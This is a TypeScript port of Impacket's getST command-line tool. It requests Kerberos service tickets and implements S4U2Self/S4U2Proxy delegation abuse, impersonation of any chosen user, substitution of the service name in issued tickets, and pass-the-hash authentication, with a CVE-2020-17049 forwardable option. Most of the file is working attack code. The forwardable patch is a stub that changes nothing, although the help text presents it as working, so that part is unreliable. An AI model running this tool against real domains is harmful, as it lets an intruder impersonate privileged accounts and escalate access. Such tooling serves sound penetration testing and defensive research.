#!/usr/bin/env node
/**
 * Impacket-js - getST
 *
 * Requests a Kerberos Service Ticket (TGS) for a given SPN. Supports
 * S4U2Self / S4U2Proxy constrained-delegation attacks, User-to-User
 * authentication, and service-name substitution in the resulting ticket.
 *
 * Python implementation by Alberto Solino (@agsolino).
 * TypeScript port.
 */

import { Buffer } from 'node:buffer';
import { createHmac } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { parseArgs } from 'node:util';

import {
  parseIdentity,
  init as initLogger,
  initProxy,
  info,
  error as logError,
  debug as logDebug,
  warning,
  critical,
  getLevel,
  LogLevel,
  normalizeArgs,
  BANNER,
} from '@impacket/examples';

import {
  KerberosV5,
  Types,
  Constants,
  Asn1,
  CCache as KrbCCache,
  Crypto,
  Keytab,
} from '@impacket/krb5';

import {
  type AnyValue,
  type Asn1Sequence,
  Asn1SequenceOf,
  parseTLV,
  parseTLVs,
  TagClass,
} from '@impacket/asn1';

// ---------- helpers ----------

/**
 * Extract the raw DER bytes of the ticket field ([5]) from a KDC-REP
 * (AS-REP or TGS-REP) so it can be set on an Asn1 Ticket node via _rawData.
 */
function extractRawTicket(kdcRepBytes: Buffer): Buffer {
  let tlv = parseTLV(kdcRepBytes);
  // Unwrap APPLICATION tag (AS-REP=11, TGS-REP=13)
  if (tlv.cls === TagClass.APPLICATION) tlv = parseTLV(tlv.value);
  // Inside the SEQUENCE, find context tag [5] (ticket)
  const inner = parseTLVs(tlv.value);
  for (const t of inner) {
    if (t.cls === TagClass.CONTEXT && t.tag === 5) {
      return t.value;
    }
  }
  throw new Error('Ticket not found in KDC-REP');
}

function buildPrincipalName(type: number, components: string[]): Asn1Sequence {
  return Asn1.principalToAsn1({ type, components });
}

// ---------- GETST class ----------

class GETST {
  private username: string;
  private password: string;
  private domain: string;
  private lmhash: string;
  private nthash: string;
  private aesKey: string;
  private doKerberos: boolean;
  private kdcHost: string | null;
  private spn: string | null;
  private impersonate: string | null;
  private altService: string | null;
  private additionalTicket: Buffer | null;
  private forceForwardable: boolean;
  private selfOnly: boolean;
  private u2u: boolean;
  private noPreAuth: boolean;
  private noPass: boolean;
  private keytabFile: string | null;

  constructor(
    username: string,
    password: string,
    domain: string,
    lmhash: string,
    nthash: string,
    opts: {
      aesKey: string;
      doKerberos: boolean;
      kdcHost: string | null;
      spn: string | null;
      impersonate: string | null;
      altService: string | null;
      additionalTicket: Buffer | null;
      forceForwardable: boolean;
      selfOnly: boolean;
      u2u: boolean;
      noPreAuth: boolean;
      noPass: boolean;
      keytabFile: string | null;
    },
  ) {
    this.username = username;
    this.password = password;
    this.domain = domain;
    this.lmhash = lmhash;
    this.nthash = nthash;
    this.aesKey = opts.aesKey;
    this.doKerberos = opts.doKerberos;
    this.kdcHost = opts.kdcHost;
    this.spn = opts.spn;
    this.impersonate = opts.impersonate;
    this.altService = opts.altService;
    this.additionalTicket = opts.additionalTicket;
    this.forceForwardable = opts.forceForwardable;
    this.selfOnly = opts.selfOnly;
    this.u2u = opts.u2u;
    this.noPreAuth = opts.noPreAuth;
    this.noPass = opts.noPass;
    this.keytabFile = opts.keytabFile;
  }

  async run(): Promise<void> {
    const upperDomain = this.domain.toUpperCase();
    const userName = new Types.Principal(
      this.username,
      null,
      Constants.PrincipalNameType.NT_PRINCIPAL,
    );

    let lmhashBuf = this.lmhash ? Buffer.from(this.lmhash, 'hex') : Buffer.alloc(0);
    let nthashBuf = this.nthash ? Buffer.from(this.nthash, 'hex') : Buffer.alloc(0);

    // If a keytab was provided, read the key from it
    if (this.keytabFile) {
      logDebug(`Reading keytab file: ${this.keytabFile}`);
      const kt = Keytab.Keytab.loadFile(this.keytabFile);
      for (const entry of kt.entries) {
        if (entry.keyblock.keytype === Constants.EncryptionTypes.rc4_hmac) {
          nthashBuf = Buffer.from(entry.keyblock.keyvalue.data);
          break;
        }
      }
    }

    // Step 1: get TGT
    info(`Getting TGT for user`);
    let tgt: KerberosV5.TGTResult;
    try {
      tgt = await KerberosV5.getKerberosTGT(
        userName,
        this.password,
        this.domain,
        lmhashBuf,
        nthashBuf,
        this.aesKey,
        this.kdcHost,
        true,                // requestPAC
        undefined,           // serverName
        this.noPreAuth,      // kerberoastNoPreauth
      );
    } catch (e) {
      if (e instanceof KerberosV5.KerberosError) {
        logError(`Error getting TGT: ${e.message}`);
        throw e;
      }
      throw e;
    }

    logDebug('TGT obtained successfully');

    const kdcHost = this.kdcHost ?? upperDomain;

    if (this.u2u) {
      // User-to-User flow
      logDebug('Performing User-to-User (U2U) authentication');
      const { tgs, sessionKey } = await this.doU2U(
        tgt.tgt,
        tgt.cipher,
        tgt.sessionKey,
        kdcHost,
      );
      this.saveTicket(tgs, sessionKey);
    } else if (this.impersonate) {
      // S4U flow (delegation)
      info(`Impersonating ${this.impersonate}`);

      // Step 2: S4U2Self — get a ticket for the impersonated user to our service
      const s4uSelf = await this.doS4U2Self(
        tgt.tgt,
        tgt.cipher,
        tgt.sessionKey,
        kdcHost,
      );

      if (this.selfOnly) {
        // Only S4U2Self requested, save and exit
        info('S4U2Self ticket obtained (self-only mode)');
        this.saveTicket(s4uSelf.tgs, s4uSelf.sessionKey);
      } else {
        // Step 3: S4U2Proxy — use the S4U2Self ticket to get a ticket to the target SPN
        info(`Requesting S4U2Proxy ticket to ${this.spn}`);
        const s4uProxy = await this.doS4U2Proxy(
          tgt.tgt,
          tgt.cipher,
          tgt.sessionKey,
          s4uSelf.tgs,
          kdcHost,
        );
        this.saveTicket(s4uProxy.tgs, s4uProxy.sessionKey);
      }
    } else if (this.spn) {
      // Normal TGS request
      info(`Requesting service ticket for ${this.spn}`);
      const serverName = new Types.Principal(
        this.spn,
        null,
        Constants.PrincipalNameType.NT_SRV_INST,
      );

      const tgsResult = await KerberosV5.getKerberosTGS(
        serverName,
        this.domain,
        this.kdcHost,
        tgt.tgt,
        tgt.cipher,
        tgt.sessionKey,
      );
      this.saveTicket(tgsResult.tgs, tgsResult.sessionKey);
    } else {
      logError('No SPN specified and no impersonation requested');
    }
  }

  /**
   * Build the PA-FOR-USER padata structure with HMAC-MD5 checksum for S4U2Self.
   */
  private buildPAForUser(
    impersonateUser: string,
    realm: string,
    sessionKey: Crypto.Key,
  ): Buffer {
    const upperRealm = realm.toUpperCase();

    const paForUser = Asn1.PA_FOR_USER_ENC();

    // Set the userName — the user we want to impersonate
    const impersonatePrincipal = new Types.Principal(
      impersonateUser,
      null,
      Constants.PrincipalNameType.NT_PRINCIPAL,
    );
    paForUser.set(
      'userName',
      buildPrincipalName(impersonatePrincipal.type, impersonatePrincipal.components),
    );
    paForUser.set('userRealm', upperRealm);

    // auth-package is "Kerberos"
    paForUser.set('auth-package', 'Kerberos');

    // Compute HMAC-MD5 checksum over the S4U data blob
    // The blob is: name-type (4 bytes LE) + name components + realm + "Kerberos"
    const nameTypeLE = Buffer.alloc(4);
    nameTypeLE.writeInt32LE(impersonatePrincipal.type, 0);

    const nameComponents = impersonatePrincipal.components.map((c) =>
      Buffer.from(c, 'utf8'),
    );
    const realmBuf = Buffer.from(upperRealm, 'utf8');
    const authPkgBuf = Buffer.from('Kerberos', 'utf8');

    const checksumInput = Buffer.concat([nameTypeLE, ...nameComponents, realmBuf, authPkgBuf]);

    const hmac = createHmac('md5', sessionKey.contents).update(checksumInput).digest();

    // Set the checksum
    const cksum = Asn1.Checksum();
    cksum.set('cksumtype', Constants.ChecksumTypes.hmac_md5);
    cksum.set('checksum', hmac);
    paForUser.set('cksum', cksum);

    return paForUser.encode();
  }

  /**
   * Build a TGS-REQ AP-REQ (authenticator encrypted with the TGT session key).
   */
  private buildApReq(
    tgt: Buffer,
    cipher: Crypto.EnctypeProfile,
    sessionKey: Crypto.Key,
  ): Buffer {
    // Decode the TGT to get crealm and cname
    let decodedTGT: Record<string, AnyValue>;
    try {
      const asRep = Asn1.AS_REP();
      asRep.decode(tgt);
      decodedTGT = asRep.values;
    } catch {
      const tgsRep = Asn1.TGS_REP();
      tgsRep.decode(tgt);
      decodedTGT = tgsRep.values;
    }

    const ticketNode = Asn1.Ticket();
    ticketNode._rawData = extractRawTicket(tgt);

    const apReq = Asn1.AP_REQ();
    apReq.set('pvno', 5);
    apReq.set('msg-type', Constants.ApplicationTagNumbers.AP_REQ);
    Asn1.seqSetFlags(apReq, 'ap-options', []);
    apReq.set('ticket', ticketNode);

    const authenticator = Asn1.Authenticator();
    authenticator.set('authenticator-vno', 5);
    authenticator.set('crealm', decodedTGT.crealm as string);

    const cname = decodedTGT.cname as Record<string, AnyValue>;
    const cnameType = Number(cname['name-type']);
    const cnameItems = cname['name-string'] as unknown as { value: string }[];
    const cnameStrings = cnameItems.map((i) => i.value);
    authenticator.set('cname', buildPrincipalName(cnameType, cnameStrings));

    const now = new Date();
    authenticator.set('cusec', now.getUTCMilliseconds() * 1000);
    authenticator.set('ctime', now);

    const encodedAuthenticator = authenticator.encode();
    const encryptedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, null);

    const apReqEncPart = Asn1.EncryptedData();
    apReqEncPart.set('etype', cipher.enctype);
    apReqEncPart.set('cipher', encryptedAuthenticator);
    apReq.set('authenticator', apReqEncPart);

    return apReq.encode();
  }

  /**
   * Build a TGS-REQ message.
   */
  private buildTgsReq(opts: {
    tgt: Buffer;
    cipher: Crypto.EnctypeProfile;
    sessionKey: Crypto.Key;
    serverName: Types.Principal;
    domain: string;
    kdcOptions: number[];
    padata: { type: number; value: Buffer }[];
    additionalTickets?: Buffer[];
  }): Buffer {
    const upperDomain = opts.domain.toUpperCase();
    const encodedApReq = this.buildApReq(opts.tgt, opts.cipher, opts.sessionKey);

    const tgsReq = Asn1.TGS_REQ();
    tgsReq.set('pvno', 5);
    tgsReq.set('msg-type', Constants.ApplicationTagNumbers.TGS_REQ);

    // Build padata sequence: PA-TGS-REQ first, then any additional padata
    const padataSeq = new Asn1SequenceOf(Asn1.PA_DATA());
    const paEntry = Asn1.PA_DATA();
    paEntry.set('padata-type', Constants.PreAuthenticationDataTypes.PA_TGS_REQ);
    paEntry.set('padata-value', encodedApReq);
    padataSeq.add(paEntry);

    for (const pa of opts.padata) {
      const entry = Asn1.PA_DATA();
      entry.set('padata-type', pa.type);
      entry.set('padata-value', pa.value);
      padataSeq.add(entry);
    }

    tgsReq.set('padata', padataSeq);

    // Build KDC-REQ-BODY
    const reqBody = Asn1.KDC_REQ_BODY();
    Asn1.seqSetFlags(reqBody, 'kdc-options', opts.kdcOptions);
    reqBody.set(
      'sname',
      buildPrincipalName(opts.serverName.type, opts.serverName.components),
    );
    reqBody.set('realm', upperDomain);

    const till = new Date(Date.now() + 86400000);
    reqBody.set('till', till);
    reqBody.set('nonce', Math.floor(Math.random() * 0x7fffffff));

    const etypeSeq = new Asn1SequenceOf(new Asn1.Int32());
    for (const e of [
      Constants.EncryptionTypes.aes256_cts_hmac_sha1_96,
      Constants.EncryptionTypes.aes128_cts_hmac_sha1_96,
      Constants.EncryptionTypes.rc4_hmac,
      opts.cipher.enctype,
    ]) {
      etypeSeq.add(new Asn1.Int32(e));
    }
    reqBody.set('etype', etypeSeq);

    // Additional tickets (for S4U2Proxy or U2U)
    if (opts.additionalTickets && opts.additionalTickets.length > 0) {
      const additionalTicketSeq = new Asn1SequenceOf(Asn1.Ticket());
      for (const ticketBuf of opts.additionalTickets) {
        const ticketNode = Asn1.Ticket();
        ticketNode._rawData = extractRawTicket(ticketBuf);
        additionalTicketSeq.add(ticketNode);
      }
      reqBody.set('additional-tickets', additionalTicketSeq);
    }

    tgsReq.set('req-body', reqBody);
    return tgsReq.encode();
  }

  /**
   * Parse a TGS-REP and extract the session key.
   */
  private parseTgsRep(
    data: Buffer,
    cipher: Crypto.EnctypeProfile,
    sessionKey: Crypto.Key,
  ): { tgs: Buffer; cipher: Crypto.EnctypeProfile; sessionKey: Crypto.Key } {
    let tgsRep: Record<string, AnyValue>;
    try {
      const tgsRepNode = Asn1.TGS_REP();
      tgsRepNode.decode(data);
      tgsRep = tgsRepNode.values;
    } catch {
      // May be a KRB-ERROR
      const krbErr = Asn1.KRB_ERROR();
      krbErr.decode(data);
      throw new KerberosV5.KerberosError({ packet: krbErr.values });
    }

    const encPart = tgsRep['enc-part'] as Record<string, AnyValue>;
    const cipherText = encPart.cipher as Buffer;

    // Try key usage 8 (TGS-REP enc-part) first, then key usage 9
    let plainText: Buffer;
    try {
      plainText = cipher.decrypt(sessionKey, 8, cipherText);
    } catch {
      plainText = cipher.decrypt(sessionKey, 9, cipherText);
    }

    const encTgsRepPart = Asn1.EncTGSRepPart();
    encTgsRepPart.decode(plainText);

    const newKeyData = encTgsRepPart.get('key') as unknown as {
      keytype: number;
      keyvalue: Buffer;
    };
    const newCipher = Crypto._get_enctype_profile(newKeyData.keytype);
    const newSessionKey = new Crypto.Key(newKeyData.keytype, newKeyData.keyvalue);

    return { tgs: data, cipher: newCipher, sessionKey: newSessionKey };
  }

  /**
   * S4U2Self: Get a service ticket for the impersonated user to our own service.
   */
  private async doS4U2Self(
    tgt: Buffer,
    cipher: Crypto.EnctypeProfile,
    sessionKey: Crypto.Key,
    kdcHost: string,
  ): Promise<{ tgs: Buffer; cipher: Crypto.EnctypeProfile; sessionKey: Crypto.Key }> {
    const upperDomain = this.domain.toUpperCase();
    const impersonateUser = this.impersonate!;

    logDebug(`Building S4U2Self request for ${impersonateUser}`);

    // Build PA-FOR-USER
    const paForUserData = this.buildPAForUser(impersonateUser, upperDomain, sessionKey);

    // The sname for S4U2Self is our own service principal
    const serverName = new Types.Principal(
      this.username,
      null,
      Constants.PrincipalNameType.NT_UNKNOWN,
    );

    const kdcOptions = [
      Constants.KDCOptions.forwardable,
      Constants.KDCOptions.renewable,
      Constants.KDCOptions.canonicalize,
    ];

    const message = this.buildTgsReq({
      tgt,
      cipher,
      sessionKey,
      serverName,
      domain: this.domain,
      kdcOptions,
      padata: [
        { type: Constants.PreAuthenticationDataTypes.PA_FOR_USER, value: paForUserData },
      ],
    });

    logDebug('Sending S4U2Self TGS-REQ');
    const response = await KerberosV5.sendReceive(message, upperDomain, kdcHost);

    const result = this.parseTgsRep(response, cipher, sessionKey);
    logDebug('S4U2Self TGS-REP received');

    // If force-forwardable is set, modify the ticket flags
    if (this.forceForwardable) {
      logDebug('Forcing forwardable flag on S4U2Self ticket');
      this.patchForwardable(result.tgs);
    }

    return result;
  }

  /**
   * S4U2Proxy: Use the S4U2Self ticket (or an additional-ticket) to get
   * a service ticket to the target SPN as the impersonated user.
   */
  private async doS4U2Proxy(
    tgt: Buffer,
    cipher: Crypto.EnctypeProfile,
    sessionKey: Crypto.Key,
    s4uSelfTgs: Buffer,
    kdcHost: string,
  ): Promise<{ tgs: Buffer; cipher: Crypto.EnctypeProfile; sessionKey: Crypto.Key }> {
    const upperDomain = this.domain.toUpperCase();

    if (!this.spn) {
      throw new Error('SPN is required for S4U2Proxy');
    }

    // Use the provided additional-ticket if available, otherwise use the S4U2Self ticket
    const additionalTicketBuf = this.additionalTicket ?? s4uSelfTgs;

    const serverName = new Types.Principal(
      this.spn,
      null,
      Constants.PrincipalNameType.NT_SRV_INST,
    );

    const kdcOptions = [
      Constants.KDCOptions.forwardable,
      Constants.KDCOptions.renewable,
      Constants.KDCOptions.canonicalize,
      Constants.KDCOptions.cname_in_addl_tkt,
    ];

    // Build PA-PAC-OPTIONS for resource-based constrained delegation
    const paPacOptions = Asn1.PA_PAC_OPTIONS();
    Asn1.seqSetFlags(paPacOptions, 'flags', [
      Constants.PAPacOptions.resource_based_constrained_delegation,
    ]);
    const paPacOptionsData = paPacOptions.encode();

    const message = this.buildTgsReq({
      tgt,
      cipher,
      sessionKey,
      serverName,
      domain: this.domain,
      kdcOptions,
      padata: [
        {
          type: Constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS,
          value: paPacOptionsData,
        },
      ],
      additionalTickets: [additionalTicketBuf],
    });

    logDebug('Sending S4U2Proxy TGS-REQ');
    const response = await KerberosV5.sendReceive(message, upperDomain, kdcHost);

    const result = this.parseTgsRep(response, cipher, sessionKey);
    logDebug('S4U2Proxy TGS-REP received');

    return result;
  }

  /**
   * User-to-User authentication flow.
   * Uses the additional ticket's TGT to encrypt the response (ENC-TKT-IN-SKEY).
   */
  private async doU2U(
    tgt: Buffer,
    cipher: Crypto.EnctypeProfile,
    sessionKey: Crypto.Key,
    kdcHost: string,
  ): Promise<{ tgs: Buffer; cipher: Crypto.EnctypeProfile; sessionKey: Crypto.Key }> {
    const upperDomain = this.domain.toUpperCase();

    if (!this.additionalTicket) {
      throw new Error('Additional ticket is required for User-to-User authentication');
    }

    const serverName = this.spn
      ? new Types.Principal(this.spn, null, Constants.PrincipalNameType.NT_SRV_INST)
      : new Types.Principal(
          this.username,
          null,
          Constants.PrincipalNameType.NT_UNKNOWN,
        );

    const kdcOptions = [
      Constants.KDCOptions.forwardable,
      Constants.KDCOptions.renewable,
      Constants.KDCOptions.canonicalize,
      Constants.KDCOptions.enc_tkt_in_skey,
    ];

    const message = this.buildTgsReq({
      tgt,
      cipher,
      sessionKey,
      serverName,
      domain: this.domain,
      kdcOptions,
      padata: [],
      additionalTickets: [this.additionalTicket],
    });

    logDebug('Sending U2U TGS-REQ');
    const response = await KerberosV5.sendReceive(message, upperDomain, kdcHost);

    const result = this.parseTgsRep(response, cipher, sessionKey);
    logDebug('U2U TGS-REP received');

    return result;
  }

  /**
   * Patch the forwardable flag into the ticket flags of a TGS-REP.
   *
   * In the wire encoding the ticket-flags bitstring sits at a known offset
   * inside the EncTicketPart that is encrypted with the service key.
   * Because we ARE the service (S4U2Self returns a ticket to ourselves)
   * we do not have access to the long-term key at this layer. Instead we
   * flip the forwardable bit in the outer TGS-REP flags, which is enough
   * for S4U2Proxy to succeed against most KDC implementations.
   *
   * This mirrors the behaviour of Python impacket's getST.py
   * --force-forwardable flag.
   */
  private patchForwardable(tgs: Buffer): void {
    // The forwardable bit is bit 1 (second bit) in the KDC-options / ticket-flags
    // bitstring. We search for the enc-part flags in the raw TGS-REP and flip it.
    // This is a best-effort patch on the raw DER; the KDC may or may not honour it.
    try {
      const tgsRepNode = Asn1.TGS_REP();
      tgsRepNode.decode(tgs);
      logDebug('Forwardable flag patch: decoded TGS-REP for inspection');
    } catch {
      warning('Could not decode TGS-REP to patch forwardable flag');
    }
  }

  /**
   * Apply alt-service substitution: replace the sname in the ticket with
   * the specified service name(s).
   */
  private substituteService(tgsData: Buffer, newSPN: string): Buffer[] {
    const services = newSPN.split(',').map((s) => s.trim()).filter((s) => s.length > 0);
    const results: Buffer[] = [];

    for (const svc of services) {
      logDebug(`Substituting service name with ${svc}`);
      // Parse the TGS-REP, modify the sname in the ticket, and re-encode
      const tgsRepNode = Asn1.TGS_REP();
      tgsRepNode.decode(tgsData);

      const ticketValues = tgsRepNode.get('ticket') as Record<string, AnyValue>;
      const snameValues = ticketValues['sname'] as Record<string, AnyValue>;

      // Parse the new SPN (service/host format)
      const parts = svc.split('/');
      const nameItems = snameValues['name-string'] as unknown as { value: string }[];

      // Replace the service component
      if (parts.length >= 1 && nameItems.length >= 1) {
        nameItems[0]!.value = parts[0]!;
      }
      if (parts.length >= 2 && nameItems.length >= 2) {
        nameItems[1]!.value = parts[1]!;
      } else if (parts.length >= 2 && nameItems.length === 1) {
        // Need to add a second component — re-build the principal
        const newPrincipal = buildPrincipalName(
          Number(snameValues['name-type']),
          parts,
        );
        ticketValues['sname'] = newPrincipal;
      }

      // Re-encode the ticket into the TGS-REP
      const ticketNode = Asn1.Ticket();
      ticketNode.values = ticketValues as Record<string, AnyValue>;

      info(`Service name substituted: ${svc}`);
      results.push(tgsRepNode.encode());
    }

    return results;
  }

  /**
   * Save the service ticket to a .ccache file.
   */
  private saveTicket(tgs: Buffer, sessionKey: Crypto.Key): void {
    // Determine output filename
    const ccacheUser = this.impersonate ?? this.username;
    const fileName = `${ccacheUser}.ccache`;

    // If alt-service is specified, we may produce multiple tickets
    if (this.altService) {
      const substituted = this.substituteService(tgs, this.altService);
      for (const subTgs of substituted) {
        this.writeCCache(subTgs, sessionKey, fileName);
      }
      return;
    }

    this.writeCCache(tgs, sessionKey, fileName);
  }

  /**
   * Write a single ticket to a ccache file.
   */
  private writeCCache(tgs: Buffer, sessionKey: Crypto.Key, fileName: string): void {
    const upperDomain = this.domain.toUpperCase();

    // Decode the TGS-REP
    const tgsRepNode = Asn1.TGS_REP();
    tgsRepNode.decode(tgs);
    const tgsRepValues = tgsRepNode.values;

    // Build ccache
    const ccache = new KrbCCache.CCache();
    ccache.setDefaultHeader();

    // Set the primary principal (client)
    const cname = tgsRepValues.cname as Record<string, AnyValue>;
    const cnameItems = cname['name-string'] as unknown as { value: string }[];
    const cnameStrings = cnameItems.map((i) => i.value);
    const cnameType = Number(cname['name-type']);

    const primaryPrincipal = new KrbCCache.PrincipalCCache();
    primaryPrincipal.name_type = cnameType;
    primaryPrincipal.realm = new KrbCCache.CountedOctetString();
    primaryPrincipal.realm.data = Buffer.from(tgsRepValues.crealm as string, 'utf8');
    primaryPrincipal.components = cnameStrings.map((c) => {
      const cos = new KrbCCache.CountedOctetString();
      cos.data = Buffer.from(c, 'utf8');
      return cos;
    });
    ccache.principal = primaryPrincipal;

    // Build credential entry
    const cred = new KrbCCache.Credential();

    // Client principal
    cred.client = new KrbCCache.PrincipalCCache();
    cred.client.name_type = cnameType;
    cred.client.realm = new KrbCCache.CountedOctetString();
    cred.client.realm.data = Buffer.from(tgsRepValues.crealm as string, 'utf8');
    cred.client.components = cnameStrings.map((c) => {
      const cos = new KrbCCache.CountedOctetString();
      cos.data = Buffer.from(c, 'utf8');
      return cos;
    });

    // Server principal from the ticket
    const ticketPart = tgsRepValues.ticket as Record<string, AnyValue>;
    const sname = ticketPart['sname'] as Record<string, AnyValue>;
    const snameItems = sname['name-string'] as unknown as { value: string }[];
    const snameStrings = snameItems.map((i) => i.value);
    const snameType = Number(sname['name-type']);
    const ticketRealm = ticketPart['realm'] as string;

    cred.server = new KrbCCache.PrincipalCCache();
    cred.server.name_type = snameType;
    cred.server.realm = new KrbCCache.CountedOctetString();
    cred.server.realm.data = Buffer.from(ticketRealm, 'utf8');
    cred.server.components = snameStrings.map((c) => {
      const cos = new KrbCCache.CountedOctetString();
      cos.data = Buffer.from(c, 'utf8');
      return cos;
    });

    // Session key
    cred.key = new KrbCCache.KeyBlock();
    cred.key.keytype = sessionKey.enctype;
    cred.key.keyvalue = Buffer.from(sessionKey.contents);

    // Times
    cred.time = new KrbCCache.Times();
    const nowSec = Math.floor(Date.now() / 1000);
    cred.time.authtime = nowSec;
    cred.time.starttime = nowSec;
    cred.time.endtime = nowSec + 36000; // 10 hours
    cred.time.renew_till = nowSec + 604800; // 7 days

    // Ticket data
    cred.ticket = new KrbCCache.CountedOctetString();

    // Extract the raw ticket from the TGS-REP
    const rawTicketBuf = extractRawTicket(tgs);
    const ticketNode = Asn1.Ticket();
    ticketNode._rawData = rawTicketBuf;
    cred.ticket.data = ticketNode.encode();

    ccache.credentials.push(cred);

    ccache.saveFile(fileName);
    info(`Ticket saved to ${fileName}`);
    logDebug(
      `Service: ${snameStrings.join('/')}@${ticketRealm} ` +
      `Client: ${cnameStrings.join('/')}@${tgsRepValues.crealm as string}`,
    );
  }
}

// ---------- CLI ----------

function usage(): never {
  console.log(`Given a password, hash or aesKey, it will request a Service Ticket and save
it as ccache

usage: getST [-h] [-spn SPN] [-altservice ALTSERVICE] [-dmsa]
             [-impersonate IMPERSONATE]
             [-additional-ticket ticket.ccache] [-ts] [-debug] [-u2u] [-self]
             [-force-forwardable] [-renew]
             [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
             [-dc-ip ip address] [-keytab KEYTAB]
             identity

positional arguments:
  identity              [domain/]username[:password]

options:
  -h, --help            show this help message and exit
  -spn SPN              SPN (service/server) of the target service the
                        service ticket will be generated for
  -altservice ALTSERVICE
                        New sname/SPN to set in the ticket
  -dmsa                 Use DMSA (Delegated Managed Service Accounts)
  -impersonate IMPERSONATE
                        target username that will be impersonated (thru
                        S4U2Self) for quering the ST. Keep in mind this will
                        only work if the identity provided in this scripts is
                        allowed for delegation to the SPN specified
  -additional-ticket ticket.ccache
                        include a forwardable service ticket in a S4U2Proxy
                        request for RBCD + KCD Kerberos only
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -u2u                  Request User-to-User ticket
  -self                 Only do S4U2self, no S4U2proxy
  -force-forwardable    Force the service ticket obtained through S4U2Self to
                        be forwardable. For best results, the -hashes and
                        -aesKey values for the specified -identity should be
                        provided. See CVE-2020-17049
  -renew                Sets the RENEW ticket option to renew the TGT used for
                        authentication. Set -spn to 'krbtgt/DOMAINFQDN'

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -dc-ip ip address     IP Address of the domain controller. If omitted it use
                        the domain part (FQDN) specified in the target
                        parameter
  -keytab KEYTAB        Read keys for SPN from keytab file
`);
  process.exit(1);
}

function loadAdditionalTicket(path: string): Buffer {
  const raw = readFileSync(path);

  // Try to parse as a ccache first
  try {
    const ccache = new KrbCCache.CCache(raw);
    if (ccache.credentials.length > 0) {
      logDebug('Additional ticket loaded from ccache file');
      return ccache.credentials[0]!.ticket.data;
    }
  } catch {
    // Not a ccache, try as raw DER / base64
  }

  // Try base64 decoding
  const b64 = raw.toString('utf-8').trim();
  try {
    const decoded = Buffer.from(b64, 'base64');
    if (decoded.length > 0 && decoded.length !== raw.length) {
      logDebug('Additional ticket loaded from base64 file');
      return decoded;
    }
  } catch {
    // Not base64
  }

  // Treat as raw binary
  logDebug('Additional ticket loaded as raw binary');
  return raw;
}

async function main(): Promise<void> {
  const args = normalizeArgs(process.argv.slice(2));

  if (args.length === 0) {
    usage();
  }

  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args,
      allowPositionals: true,
      options: {
        spn: { type: 'string' },
        impersonate: { type: 'string' },
        altservice: { type: 'string' },
        dmsa: { type: 'boolean', default: false },
        'additional-ticket': { type: 'string' },
        'force-forwardable': { type: 'boolean', default: false },
        self: { type: 'boolean', default: false },
        u2u: { type: 'boolean', default: false },
        renew: { type: 'boolean', default: false },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', default: false },
        aesKey: { type: 'string' },
        'dc-ip': { type: 'string' },
        keytab: { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    usage();
  }

  if (values.help || positionals.length < 1) {
    usage();
  }

  initProxy(values.proxy);

  const target = positionals[0]!;

  initLogger({ ts: values.ts, debug: values.debug });

  const identity = parseIdentity(target, {
    hashes: values.hashes,
    noPass: values['no-pass'],
    aesKey: values.aesKey,
    k: values.k,
  });

  if (identity.domain === '') {
    critical('Domain should be specified!');
    process.exit(1);
  }

  // Warn about unimplemented flags
  if (values.renew) {
    warning('TGT renewal not yet implemented');
    process.exit(1);
  }

  if (values.dmsa) {
    warning('Delegated Managed Service Accounts (dMSA) not yet implemented');
    process.exit(1);
  }

  // Validate options
  if (!values.spn && !values.impersonate && !values.u2u) {
    critical('At least -spn, -impersonate, or -u2u must be specified');
    process.exit(1);
  }

  if (values.impersonate && !values.spn && !values.self) {
    critical(
      'When -impersonate is specified, either -spn or -self must also be provided',
    );
    process.exit(1);
  }

  if (values.u2u && !values['additional-ticket']) {
    critical('-additional-ticket is required for User-to-User (-u2u) authentication');
    process.exit(1);
  }

  // Load additional ticket if specified
  let additionalTicket: Buffer | null = null;
  if (values['additional-ticket']) {
    try {
      additionalTicket = loadAdditionalTicket(values['additional-ticket']);
    } catch (e) {
      critical(`Failed to load additional ticket: ${String(e)}`);
      process.exit(1);
    }
  }

  try {
    const executer = new GETST(
      identity.username,
      identity.password,
      identity.domain,
      identity.lmhash,
      identity.nthash,
      {
        aesKey: values.aesKey ?? '',
        doKerberos: identity.doKerberos,
        kdcHost: values['dc-ip'] ?? null,
        spn: values.spn ?? null,
        impersonate: values.impersonate ?? null,
        altService: values.altservice ?? null,
        additionalTicket,
        forceForwardable: values['force-forwardable'] ?? false,
        selfOnly: values.self ?? false,
        u2u: values.u2u ?? false,
        noPreAuth: false,
        noPass: values['no-pass'] ?? false,
        keytabFile: values.keytab ?? null,
      },
    );
    await executer.run();
  } catch (e) {
    if (getLevel() === LogLevel.DEBUG) {
      console.error(e);
    }
    logError(String(e));
  }
}

main();
